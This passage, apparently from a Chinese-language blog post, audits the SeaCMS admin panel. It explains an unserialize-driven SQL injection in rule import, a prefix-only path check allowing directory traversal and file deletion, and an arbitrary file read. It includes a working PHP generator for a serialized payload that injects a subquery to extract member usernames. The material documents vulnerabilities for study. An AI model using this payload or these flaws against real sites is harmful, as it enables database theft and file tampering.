+</span></span><span class="line"><span class="cl">			<span class="nv">$type</span><span class="p">[</span><span class="s1">&#39;cid&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$cid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$type</span><span class="p">[</span><span class="s1">&#39;addtime&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">time</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$type</span><span class="p">[</span><span class="s1">&#39;cjtime&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$type</span><span class="p">[</span><span class="s1">&#39;cotype&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$data</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$sql</span> <span class="o">=</span> <span class="nx">si</span><span class="p">(</span><span class="s2">&#34;sea_co_type&#34;</span><span class="p">,</span><span class="nv">$data</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">ExecuteNoneQuery</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">ShowMsg</span><span class="p">(</span><span class="s1">&#39;成功导入规则!&#39;</span><span class="p">,</span><span class="s1">&#39;admin_collect_news.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">si</span><span class="p">(</span><span class="nv">$table</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$needQs</span><span class="o">=</span><span class="k">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$t1</span> <span class="o">=</span> <span class="nv">$t2</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">foreach</span><span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nv">$i</span><span class="o">!=</span><span class="mi">0</span><span class="o">&amp;&amp;</span><span class="nv">$i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$t1</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				
+</span></span><span class="line"><span class="cl">				<span class="nv">$t2</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$needQs</span><span class="o">?</span><span class="nx">qs</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">:</span><span class="s2">&#34;&#39;</span><span class="si">$value</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			
+</span></span><span class="line"><span class="cl">			<span class="nv">$i</span><span class="o">+=</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$sql</span> <span class="o">=</span>  <span class="s2">&#34;INSERT INTO `</span><span class="si">$table</span><span class="s2">` (`&#34;</span><span class="o">.</span><span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;`,`&#34;</span><span class="p">,</span><span class="nv">$t1</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;`) VALUES(&#34;</span><span class="o">.</span><span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span><span class="nv">$t2</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$arr</span> <span class="o">=</span> <span class="nx">array_keys</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$feild</span> <span class="o">=</span> <span class="nv">$arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="nv">$feild</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$needQs</span><span class="o">?</span><span class="nx">qs</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">:</span><span class="s2">&#34;&#39;</span><span class="si">$value</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;INSERT INTO `</span><span class="si">$table</span><span class="s2">` (`</span><span class="si">$feild</span><span class="s2">`) VALUES (</span><span class="si">$value</span><span class="s2">)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nv">$sql</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">qs</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="s2">&#34;&#39;&#34;</span><span class="o">.</span><span class="nx">addslashes</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>$importrule = unserialize(base64_decode($importrule))</code>对<code>$importrule</code>进行base64解码后进行反序列化(全局搜索了一下,除了php原生类之外好像没有别的利用点)</p>
+<p>反序列化后要满足这个条件<code>if(!is_array($importrule) || !is_array($importrule['config']) || !is_array($importrule['type']))</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$importrule</span><span class="p">[</span><span class="s1">&#39;config&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;cid&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;cname&#39;</span><span class="p">]</span><span class="o">.=</span><span class="s2">&#34;(导入时间:&#34;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d H:i:s&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;cotype&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="nx">si</span><span class="p">(</span><span class="s2">&#34;sea_co_config&#34;</span><span class="p">,</span><span class="nv">$data</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对反序列化解析出的<code>$importrule['config']</code>进行一定的处理,处理后的<code>$data</code>被传入到<code>si</code>中,显然<code>count($data)</code>大于1,但要注意只有当<code>$i%2==0</code>时数据才会被拼接到sql语句中,因此在构造序列化数组时要注意添加垃圾数据进行填充</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$i</span><span class="o">!=</span><span class="mi">0</span><span class="o">&amp;&amp;</span><span class="nv">$i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$t1</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$t2</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$needQs</span><span class="o">?</span><span class="nx">qs</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">:</span><span class="s2">&#34;&#39;</span><span class="si">$value</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$i</span><span class="o">+=</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span>  <span class="s2">&#34;INSERT INTO `</span><span class="si">$table</span><span class="s2">` (`&#34;</span><span class="o">.</span><span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;`,`&#34;</span><span class="p">,</span><span class="nv">$t1</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;`) VALUES(&#34;</span><span class="o">.</span><span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span><span class="nv">$t2</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;)&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同时要注意<code>sea_co_config</code>的表属性,其中<code>cname</code>的长度限制为50</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081048580.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081048580.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081048580.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081048580.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081048580.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081048580.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$importrule</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$importrule</span><span class="p">[</span><span class="s1">&#39;config&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$importrule</span><span class="p">[</span><span class="s1">&#39;config&#39;</span><span class="p">][</span><span class="s1">&#39;abc&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;asdf&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$importrule</span><span class="p">[</span><span class="s1">&#39;config&#39;</span><span class="p">][</span><span class="s1">&#39;123&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;asdf&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$importrule</span><span class="p">[</span><span class="s1">&#39;config&#39;</span><span class="p">][</span><span class="s1">&#39;cname`,`getlistnum`,`getconnum`,`cotype`) values ((select group_concat(username) from seacms.sea_member),10,100,1)#&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;asdf&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$importrule</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$importrule</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="s2">&#34;BASE64:&#34;</span><span class="o">.</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$importrule</span><span class="p">))</span><span class="o">.</span><span class="s2">&#34;:END&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081053345.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081053345.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081053345.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081053345.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081053345.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081053345.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081054054.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081054054.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081054054.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081054054.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081054054.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081054054.png" /></p>
+<h2 id="adminadmin_templatephp存在目录穿越任意文件删除漏洞">admin/admin_template.php存在目录穿越/任意文件删除漏洞</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;/config.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$action</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$action</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$dirTemplate</span><span class="o">=</span><span class="s2">&#34;../templets&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="nv">$path</span><span class="o">=</span><span class="nv">$dirTemplate</span><span class="p">;</span> <span class="k">else</span> <span class="nv">$path</span><span class="o">=</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">)</span><span class="o">!=</span><span class="nv">$dirTemplate</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">ShowMsg</span><span class="p">(</span><span class="s2">&#34;只允许编辑templets目录！&#34;</span><span class="p">,</span><span class="s2">&#34;admin_template.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$flist</span><span class="o">=</span><span class="nx">getFolderList</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">include</span><span class="p">(</span><span class="nx">sea_ADMIN</span><span class="o">.</span><span class="s1">&#39;/templets/admin_template.htm&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>只要求满足<code>substr($path,0,11)==$dirTemplate</code>即前11个字符为<code>../templets</code>因此可以传入<code>..</code>进行目录穿越</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081116146.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081116146.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081116146.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081116146.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081116146.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081116146.png" /></p>
+<h2 id="adminadmin_collectphp存在任意文件读取">admin/admin_collect.php存在任意文件读取</h2>
+<p>全局搜索<code>@file_get_contents</code>发现有几个html模板里面有这个函数,因此查找哪个php文件调用了这几个模板</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081151911.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081151911.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081151911.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081151911.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081151911.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081151911.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081152717.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081152717.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081152717.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081152717.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081152717.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081152717.png" /></p>
+<p>在目标站点URL处输入即可</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081156234.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081156234.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081156234.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081156234.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081156234.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081156234.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081149826.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081149826.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081149826.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081149826.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081149826.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081149826.png" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-03-12</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/bluecms/" class="prev" rel="prev" title="BlueCMS"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>BlueCMS</a>
+            <a href="/dedecms_v5.7_sp2/" class="next" rel="next" title="DeDeCMS_V5.7_SP2">DeDeCMS_V5.7_SP2<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mi3aka</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
